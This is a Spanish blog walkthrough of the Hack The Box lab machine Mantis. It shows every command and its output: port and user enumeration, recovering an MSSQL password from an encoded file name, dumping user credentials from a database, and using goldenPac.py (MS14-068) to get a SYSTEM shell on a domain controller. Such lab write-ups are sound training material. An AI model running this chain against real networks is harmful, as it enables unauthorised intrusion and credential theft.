---
layout: single
title: Mantis - Hack The Box
excerpt: "En este post vamos a hacer la maquina Mantis de la plataforma de Hackthebox donde vamos a estar encontrando una ruta en un servicio web donde nos darán credenciales para conectarnos a una base de datos al conectarnos encontraremos credenciales de un usuario para poder conectarnos con evil-winrm para la escalada de privilegios usaremos goldenPac.py para conectarnos con las credenciales de un usuario el cual estaremos como nt authority system gracias a la vulnerabilidad  MS14-068"
date: 2023-07-29
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-mantis/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Active Directory
  - Exploiting MS14-068 (goldenPac.py)
  - Database Enumeration
---

<p align="center">
<img src="/assets/images/htb-writeup-mantis/banner.png">
</p>

```bash
❯ ping -c 1 10.129.116.149
PING 10.129.116.149 (10.129.116.149) 56(84) bytes of data.
64 bytes from 10.129.116.149: icmp_seq=1 ttl=127 time=156 ms

--- 10.129.116.149 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 156.286/156.286/156.286/0.000 ms
❯ whichSystem.py 10.129.116.149

10.129.116.149 (ttl -> 127): Windows
```

## PortScan

```bash
❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,49157,49158,49166,49170,49188,50255 10.129.116.149 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-28 12:14 CST
Nmap scan report for 10.129.116.149
Host is up (0.15s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-28 18:14:34Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-07-28T18:08:35
|_Not valid after:  2053-07-28T18:08:35
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-07-28T18:15:44+00:00; -2s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49166/tcp open  msrpc        Microsoft Windows RPC
49170/tcp open  msrpc        Microsoft Windows RPC
49188/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-07-28T18:08:35
|_Not valid after:  2053-07-28T18:08:35
|_ssl-date: 2023-07-28T18:15:44+00:00; -2s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-28T18:15:33
|_  start_date: 2023-07-28T18:08:28
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2023-07-28T14:15:32-04:00
|_clock-skew: mean: 47m57s, deviation: 1h47m20s, median: -2s
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```

## Enumeracion

Vemos muchos puertos abiertos entre ellos `mysql` , `kerberos` `http` y demás pero vamos a comenzar viendo ante que estamos 

```bash
❯ crackmapexec smb 10.129.116.149
SMB         10.129.116.149  445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
```

Vamos a agregar el dominio al `/etc/hosts`

```bash
❯ echo "10.129.116.149 mantis.htb mantis.htb.local htb.local" | sudo tee -a /etc/hosts
10.129.116.149 mantis.htb mantis.htb.local htb.local
```

De momento no vemos ningún recurso compartido por `smb`

```bash
❯ smbclient -L 10.129.116.149 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

Esta es la pagina `web` que esta corriendo en el puerto `8080`

![](/assets/images/htb-writeup-mantis/web1.png)

Estas son las tecnologías que esta corriendo el servicio web 

```ruby
❯ whatweb http://10.129.116.149:8080
http://10.129.116.149:8080 [200 OK] ASP_NET[4.0.30319][MVC5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/7.5], IP[10.129.116.149], MetaGenerator[Orchard], Microsoft-IIS[7.5], Script[text/javascript], Title[Tossed Salad - Blog], UncommonHeaders[x-generator,x-aspnetmvc-version], X-Powered-By[ASP.NET]
```

También tenemos este puerto abierto que es `http`

![](/assets/images/htb-writeup-mantis/web2.png)

Pero bueno como es un entorno de **Active Directory** podemos usar `kerbrute` y usar un diccionario de `seclists` para enumerar usuarios validos si es que hay para que en caso de encontrar usuarios validos probar un `ASREPRoast Attack`

Primero necesitamos `kerbrute` <https://github.com/ropnop/kerbrute/releases>

Encontramos que existen estos usuarios

```bash
❯ ./kerbrute userenum -d htb.local --dc mantis.htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/28/23 - Ronnie Flathers @ropnop

2023/07/28 12:32:45 >  Using KDC(s):
2023/07/28 12:32:45 >  	mantis.htb.local:88

2023/07/28 12:32:46 >  [+] VALID USERNAME:	james@htb.local
2023/07/28 12:32:52 >  [+] VALID USERNAME:	James@htb.local
2023/07/28 12:33:16 >  [+] VALID USERNAME:	administrator@htb.local
2023/07/28 12:33:39 >  [+] VALID USERNAME:	mantis@htb.local
```

Vamos a añadirlo a una lista para poder emplear `GetNPUsers` pero ningún usuario es vulnerable a este ataque

```bash
❯ GetNPUsers.py htb.local/ -no-pass -usersfile users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mantis doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Si probamos conectándonos con `rpcclient` vemos que no funciona emplear un `Null Session`

```bash
❯ rpcclient 10.129.116.149 -N -U ''
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```

Vamos a aplicar `Fuzzing` para ver si encontramos directorios en el servicio **web** que corre en el puerto `1337`

```bash
❯ gobuster dir -u http://10.129.116.149:1337 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 80 --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.116.149:1337
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/07/28 12:47:42 Starting gobuster in directory enumeration mode
===============================================================
/orchard              (Status: 500) [Size: 3026]
/secure_notes         (Status: 301) [Size: 163] [--> http://10.129.116.149:1337/secure_notes/]
```

Vemos esto en la ruta `orchard`

![](/assets/images/htb-writeup-mantis/web3.png)

Y ya vemos esto interesante en `secure_notes`

![](/assets/images/htb-writeup-mantis/web4.png)

`web.config` nos da un error 

![](/assets/images/htb-writeup-mantis/web5.png)

Aquí ya vemos que nos están dando información sobre `SQL Server` que el puerto como tal esta abierto 

![](/assets/images/htb-writeup-mantis/web6.png)

Si nos fijamos en el nombre del archivo vemos que esta en `base64` a si que vamos aplicar un `decode`

```bash
❯ echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d; echo
6d2424716c5f53405f504073735730726421
```

Y nos devuelve una cadena en `hexadecimal` y al final una contraseña 

```bash
❯ echo "6d2424716c5f53405f504073735730726421" | xxd -ps -r; echo
m$$ql_S@_P@ssW0rd!
```

## mssqlclient admin 

Si revisamos en las notas nos dicen que el usuario es `admin` que lo mas probable es que esa base de datos que nos piden crear ya esta creada y como tal tenemos una contraseña a si que nos podemos conectar con  `mssqlclient.py`

```bash
❯ impacket-mssqlclient htb.local/admin:'m$$ql_S@_P@ssW0rd!'@mantis.htb.local
Impacket v0.10.1.dev1+20230207.122134.c812d6c7 - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

Vamos a enumerar las bases de datos

```bash
SQL> select name from sysdatabases;
name                                                                                                                           >

------------------------------------------------------------------------------------------------------------------------------->

master                                                                                                                         >

tempdb                                                                                                                         >

model                                                                                                                          >

msdb                                                                                                                           >

orcharddb                                                                                                                      >

SQL> 
```

Vamos a usar la base de datos `orcharddb`

```bash
SQL> use orcharddb;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: orcharddb
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'orcharddb'.
SQL> 
```

Ahora vamos a enumerar las tablas para esa base de datos filtrando directamente por alguna que contenga la palabra `user`

```bash
SQL> select name from sys.tables where name like '%user%';
name                                                                                                                           >

------------------------------------------------------------------------------------------------------------------------------->

blog_Orchard_Users_UserPartRecord                                                                                              >

blog_Orchard_Roles_UserRolesPartRecord    
```

Ahora listamos las columnas de las tablas

```bash
SQL> select name from sys.columns where object_id = object_id('blog_Orchard_Users_UserPartRecord');  

name
--------------------------------------------------------------------------

Id
UserName
Email
NormalizedUserName
Password
PasswordFormat
HashAlgorithm
PasswordSalt
RegistrationStatus
EmailStatus
EmailChallengeToken
CreatedUtc
LastLoginUtc
LastLogoutUtc

SQL>
```

Ahora vamos a leer el contenido de estas columnas interesantes y tenemos las contraseñas y la de `admin` esta en `base64`

```bash
SQL> select username,password from blog_Orchard_Users_UserPartRecord

username                          password
--------------------------------- ----------------------------------------------------------------------  

admin                              AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==
James                              J@m3s_P@ssW0rd!

SQL>
```

## Shell as administrator

Ahora vemos que las credenciales sean correctas

```bash
❯ crackmapexec smb mantis.htb.local -u James -p J@m3s_P@ssW0rd!
SMB         mantis.htb      445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         mantis.htb      445    MANTIS           [+] htb.local\James:J@m3s_P@ssW0rd!
```

Con `crackmapexec` también podemos verificar si un usuario pertenece a un grupo en este caso este es de interés 

```bash
❯ crackmapexec smb mantis.htb.local -u James -p J@m3s_P@ssW0rd! --groups 'Remote Desktop Users'
SMB         mantis.htb      445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         mantis.htb      445    MANTIS           [+] htb.local\James:J@m3s_P@ssW0rd! 
SMB         mantis.htb      445    MANTIS           [+] Enumerated members of domain group
SMB         mantis.htb      445    MANTIS           htb.local\james
```

Si buscamos información sobre la maquina en `Hackthebox` esta es la vulnerabilidad a explotar pero como tal podemos usar `goldenPac` <https://adsecurity.org/?p=541> nos conectamos con las credenciales de `James` y obtenemos `shell` como `nt authority\system` <https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Methodology%20and%20Resources/Active%20Directory%20Attack/#other-interesting-commands>

```bash
❯ goldenPac.py htb.local/James:'J@m3s_P@ssW0rd!'@mantis.htb.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file eHwshorC.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service GNlg on mantis.htb.local.....
[*] Starting service GNlg.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

## User.txt 

```bash
C:\Windows\system32>type C:\Users\James\Desktop\user.txt
62d7a1dbb3d5d824a814e4308408140a

C:\Windows\system32>         
```

## Root.txt 

```bash
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
521f6d02f0ce80cd0ee5db0dc3a41378

C:\Windows\system32>
```

Gracias a GatoGamer1155 por resolverme unas dudas <https://gatogamer1155.github.io>
